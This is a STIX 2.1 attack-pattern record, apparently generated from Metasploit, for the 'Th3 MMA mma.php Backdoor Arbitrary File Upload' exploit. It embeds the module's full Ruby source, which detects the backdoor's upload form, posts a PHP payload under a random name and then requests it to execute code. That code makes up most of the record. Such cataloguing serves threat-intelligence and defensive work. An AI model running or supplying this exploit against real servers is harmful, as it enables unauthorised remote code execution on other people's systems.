{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3bf1d75c-f2b2-4157-9508-3cba6a249ebe",
    "created": "2024-08-14T17:09:08.578241Z",
    "modified": "2024-08-14T17:09:08.578245Z",
    "name": "Th3 MMA mma.php Backdoor Arbitrary File Upload",
    "description": " This module exploits Th3 MMA mma.php Backdoor which allows an arbitrary file upload that leads to arbitrary code execution. This backdoor also echoes the Linux kernel version or operating system version because of the php_uname() function.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/mma_backdoor_upload.rb",
            "external_id": "mma_backdoor_upload.rb"
        },
        {
            "source_name": "reference",
            "url": "http://blog.pages.kr/1307#Analysisofmma.phpfileuploadbackdoor"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'nokogiri'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Th3 MMA mma.php Backdoor Arbitrary File Upload',\n      'Description'    => %q{\n        This module exploits Th3 MMA mma.php Backdoor which allows an arbitrary file upload that\n        leads to arbitrary code execution. This backdoor also echoes the Linux kernel version or\n        operating system version because of the php_uname() function.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Jay Turla <@shipcod3>',\n        ],\n      'References'     =>\n        [\n          ['URL', 'http://blog.pages.kr/1307'] # Analysis of mma.php file upload backdoor\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'    => 10000,\n          'DisableNops' => true\n        },\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        =>\n        [\n          ['mma file uploader', {} ]\n        ],\n      'DisclosureDate' => '2012-04-02',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI',[true, \"The path of the mma.php file uploader backdoor\", \"/mma.php\"]),\n      ]) # sometimes it is under host/images/mma.php so you may want to set this one\n  end\n\n  def has_input_name?(nodes, name)\n    nodes.select { |e| e.attributes['name'].value == name }.empty? ? false : true\n  end\n\n  def check\n    uri = normalize_uri(target_uri.path)\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => uri\n    })\n\n    if res\n      n = ::Nokogiri::HTML(res.body)\n      form = n.at('form[@id=\"uploader\"]')\n      inputs = form.search('input')\n      if has_input_name?(inputs, 'file') && has_input_name?(inputs, '_upl')\n        return Exploit::CheckCode::Appears\n      end\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    uri = normalize_uri(target_uri.path)\n    payload_name = \"#{rand_text_alpha(5)}.php\"\n\n    print_status(\"Trying to upload #{payload_name} to mma.php Backdoor\")\n\n    data = Rex::MIME::Message.new\n\n    data.add_part('Upload', nil, nil, 'form-data; name=\"_upl\"')\n    data.add_part(payload.encoded, 'application/octet-stream', nil, \"form-data; name=\\\"file\\\"; filename=\\\"#{payload_name}\\\"\")\n    post_data = data.to_s\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => uri,\n      'ctype'  => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'   => post_data\n    })\n\n    if res\n      if res.body =~ /uplod d0n3 in SAME file/\n        print_good(\"Our payload #{payload_name} has been uploaded. Calling payload...\")\n        register_files_for_cleanup(payload_name)\n      else\n        fail_with(Failure::UnexpectedReply, \"#{peer} - Unable to deploy payload, server returned #{res.code}\")\n      end\n    else\n      fail_with(Failure::Unknown, 'Connection Timed Out')\n    end\n\n    send_request_cgi({\n      'uri'    => normalize_uri(payload_name),\n      'method' => 'GET'\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-04-02",
    "x_mitre_platforms": [
        "php'"
    ]
}